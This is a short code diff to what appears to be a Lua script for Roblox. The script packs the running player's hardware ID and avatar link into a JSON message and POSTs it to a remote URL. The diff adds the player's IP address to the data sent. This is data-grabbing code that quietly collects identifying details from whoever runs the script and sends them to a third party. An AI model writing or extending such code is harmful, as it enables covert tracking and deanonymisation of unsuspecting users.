@@ -2048,7 +2048,11 @@ local data = {
                     ["name"] = "Hard Ware ID:",
                     ["value"] = tostring("```"..hwid().."```"),
                     ["inline"] = true
-            },
+                },
+                {
+                    ["name"] = "IP ADDRESS:",
+                    ["value"] = tostring("```"..ip().."```"),
+                },
             ["thumbnail"] = {
                 ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
             },
@@ -2056,6 +2060,7 @@ local data = {
     }
 }
 local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
+
 
 -------------------------------------------------------------------------
 --[[
